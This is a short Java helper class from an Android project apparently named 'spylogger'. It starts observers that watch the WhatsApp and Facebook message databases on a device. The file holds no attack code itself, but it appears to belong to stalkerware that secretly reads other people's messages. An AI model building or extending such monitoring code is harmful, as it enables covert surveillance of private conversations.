package com.gravatasufoca.spylogger.helpers;

import android.content.Context;

import com.gravatasufoca.spylogger.observers.DbObserver;
import com.gravatasufoca.spylogger.observers.FaceDbObserver;
import com.gravatasufoca.spylogger.observers.WhatsDbObserver;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by bruno on 21/04/17.
 */

public class MensageiroObserversHelper {
    private Context context;
    private List<DbObserver> dbObservers=new ArrayList<>();

    public MensageiroObserversHelper(Context context) {
        this.context = context;
    }

    public void start(){
        dbObservers.add(new WhatsDbObserver(context));
        dbObservers.add(new FaceDbObserver(context));

        for(DbObserver observer: dbObservers){
            observer.observe();
        }
    }
}
